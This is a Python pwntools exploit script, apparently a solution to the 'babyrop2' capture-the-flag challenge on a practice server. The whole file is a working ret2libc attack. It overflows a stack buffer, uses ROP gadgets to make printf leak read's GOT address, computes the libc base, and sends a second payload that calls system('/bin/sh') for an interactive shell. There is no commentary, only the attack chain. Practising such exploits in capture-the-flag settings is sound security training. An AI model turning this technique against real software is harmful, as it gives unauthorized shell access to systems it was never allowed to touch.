from pwn import *
from LibcSearcher import *
context(log_level='DEBUG')
#io = process("./babyrop2")
io = remote("node3.buuoj.cn",26898)
elf = ELF("./babyrop2")
libc = ELF("libc.so.6")
printf_plt = elf.plt['printf']
read_got = elf.got['read']
main = elf.sym['main']
fmt_str = 0x00400770
pop_rdi_ret = 0x0400733
pop_rsi_r15_ret = 0x400731
io.recv()
payload = 'a'*0x28 + p64(pop_rdi_ret)+ p64(fmt_str) +p64(pop_rsi_r15_ret) 
payload +=  p64(read_got)+p64(0) + p64(printf_plt)+ p64(main) 
io.sendline(payload)
io.recvuntil("again, ")
io.recvuntil("again, ")
read_add  = u64(io.recv(6).ljust(8,'\x00'))
print hex(read_add ) 
#libc = LibcSearcher('read',read_add)
base = read_add - libc.sym['read']
system_add = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
io.recv()
payload = 'a'*0x28 +p64(pop_rdi_ret)+ p64(bin_sh) + p64(system_add)+p64(main)
io.sendline(payload)
io.interactive()